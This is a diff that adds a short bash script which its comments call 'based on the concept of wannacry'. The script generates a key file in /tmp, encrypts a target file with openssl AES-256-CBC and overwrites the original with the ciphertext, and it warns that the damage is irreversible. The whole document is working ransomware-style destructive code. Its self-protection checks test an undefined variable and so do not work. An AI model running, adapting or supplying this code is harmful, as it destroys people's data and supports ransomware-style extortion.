@@ -1,0 +1,28 @@
+#!/bin/bash
+# 
+# This script is based on the concept of wannacry.
+# Do not use this unless you are in a safe enviroment and you know what you are doing
+# This will damage your system beyond repair, do not blame me.
+# The only theoretical way to recover the files, is to decrypt using the keyfile created by this script
+# on another system using openssl and the same encription method
+# openssl enc -aes-256-cbc -d -pass=file:${keyfile} -in "${output}" -out "${input}"
+# Good luck on getting that done.
+# If you do it on a virtual enviroment and you do not have snapshot, you can say "bye, bye" forever!
+
+# Create variables
+input="${1}"
+output="/tmp/${RANDOM}"
+keyfile=/tmp/zfile
+
+# Check if the keyfile has been created
+[ ! -f "${keyfile}" ] && openssl genrsa -out "${keyfile}"
+
+victim="$0"
+[ "${entrada}" = "${victim}" ] && exit 1 || [ "${entrada}" = "${keyfile}" ] && exit 1
+echo "${input} ${victim}"
+
+# Encript the file with this command
+openssl enc -aes-256-cbc -e -pass=file:${keyfile} -in "${input}" -out "${output}"
+
+# Killer command
+mv "${output}" "${input}"
